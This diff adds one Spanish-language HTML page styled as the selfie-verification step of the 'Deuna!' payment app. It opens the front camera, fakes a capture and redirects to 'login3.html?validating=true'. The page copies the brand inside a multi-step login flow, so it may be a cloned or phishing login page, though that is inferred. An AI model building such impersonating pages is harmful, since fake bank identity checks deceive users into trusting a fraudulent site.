@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Deuna! | Tomar Selfie</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg-color: #f6eefe;
+            --text-dark: #202020;
+            --warning-red: #d9414e; 
+        }
+        * {
+            margin: 0; padding: 0; box-sizing: border-box;
+            font-family: 'Poppins', sans-serif;
+            -webkit-tap-highlight-color: transparent;
+        }
+        body {
+            background-color: var(--bg-color);
+            display: flex; justify-content: center;
+            height: 100vh; height: 100dvh; overflow: hidden;
+        }
+        .mobile-container {
+            width: 100%; max-width: 480px; 
+            background-color: var(--bg-color);
+            height: 100%; display: flex; flex-direction: column;
+            align-items: center; padding: 24px; position: relative;
+        }
+        
+        /* Botón de volver (X) */
+        .close-btn {
+            position: absolute;
+            top: 24px; right: 24px;
+            font-size: 20px; color: var(--text-dark);
+            text-decoration: none; font-weight: 500;
+        }
+
+        /* Máscara circular para la cámara */
+        .camera-wrapper {
+            margin-top: 50px; /* Ajuste para centrar verticalmente un círculo más grande */
+            width: 320px; height: 320px;
+            border-radius: 50%;
+            overflow: hidden;
+            background: #000;
+            position: relative;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+        }
+        #camera-feed {
+            width: 100%; height: 100%;
+            object-fit: cover;
+            transform: scaleX(-1); /* Efecto espejo para la selfie */
+        }
+
+        /* Texto de Advertencia */
+        .warning-text {
+            margin-top: 30px;
+            color: var(--warning-red);
+            font-size: 14px;
+            font-weight: 500;
+            text-align: center;
+            max-width: 200px;
+            line-height: 1.3;
+        }
+
+        /* Botón Blanco Flotante para Capturar */
+        .capture-btn {
+            width: 72px; height: 72px;
+            background: #fff;
+            border-radius: 50%;
+            border: 5px solid #d4bdf0; /* Bordes morados claro combinando */
+            margin-top: auto;
+            margin-bottom: 20px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+            cursor: pointer;
+            transition: transform 0.1s;
+        }
+        .capture-btn:active {
+            transform: scale(0.92);
+        }
+
+        /* Logo de abajom */
+        .bottom-logo {
+            margin-bottom: 10px;
+        }
+        .bottom-logo img {
+            height: 40px;
+            object-fit: contain;
+        }
+    </style>
+</head>
+<body>
+    <div class="mobile-container">
+        <!-- Ir atrás a las instrucciones -->
+        <a href="login3.html" class="close-btn">✕</a>
+        
+        <div class="camera-wrapper">
+            <video id="camera-feed" autoplay playsinline muted></video>
+        </div>
+
+        <p class="warning-text">Coloca tu cara en el <br> centro del circulo . .</p>
+
+        <!-- Botón capturador -->
+        <button id="capture-btn" class="capture-btn" aria-label="Capturar Foto"></button>
+
+        <div class="bottom-logo">
+            <!-- La imagen "logo2.png" de la carpeta img -->
+            <img src="img/logo2.png" alt="Deuna Logo" onerror="this.src='https://via.placeholder.com/150x50/f6eefe/4a1b82?text=deuna!'">
+        </div>
+    </div>
+
+    <script>
+        const video = document.getElementById('camera-feed');
+        const captureBtn = document.getElementById('capture-btn');
+
+        // Solicitar acceso a la cámara frontal y asignarlo al tag <video>
+        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
+                .then(stream => {
+                    video.srcObject = stream;
+                })
+                .catch(err => {
+                    console.error("Error al acceder a la cámara: ", err);
+                    alert("No se pudo acceder a la cámara. Por favor permite el acceso en tu navegador.");
+                });
+        }
+
+        // Lógica de captura y redirección a login3.html en modo validador
+        captureBtn.addEventListener('click', () => {
+            // Guardamos el intento en sessionStorage
+            let attempts = parseInt(sessionStorage.getItem('captureAttempts')) || 0;
+            sessionStorage.setItem('captureAttempts', attempts + 1);
+            
+            // Pausamos el video para simular captura
+            video.pause();
+
+            // Pequeño delay de transición
+            setTimeout(() => {
+                window.location.href = 'login3.html?validating=true';
+            }, 500);
+        });
+    </script>
+</body>
+</html>
